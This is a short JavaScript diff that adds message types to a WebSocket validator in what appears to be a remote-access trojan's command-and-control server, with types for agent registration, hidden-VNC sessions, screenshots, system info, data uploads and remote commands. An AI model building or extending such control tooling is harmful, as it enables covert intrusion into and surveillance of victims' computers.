@@ -155,7 +155,8 @@ const validateWebSocketMessage = (data) => {
     // Validate message type
     const validTypes = [
         'register', 'heartbeat', 'command_result', 'data_upload', 'screenshot', 'sysinfo', 'auth', 'web_client',
-        'agent_register', 'hvnc_start', 'hvnc_stop', 'hvnc_response', 'hvnc_frame', 'command', 'command_response'
+        'agent_register', 'hvnc_start', 'hvnc_stop', 'hvnc_response', 'hvnc_frame', 'command', 'command_response', 'output',
+        'simple_command', 'command_retry', 'task_created', 'task_updated', 'command_sent'
     ];
     if (!data.type || !validTypes.includes(data.type)) {
         console.log('Invalid message type received:', data.type);
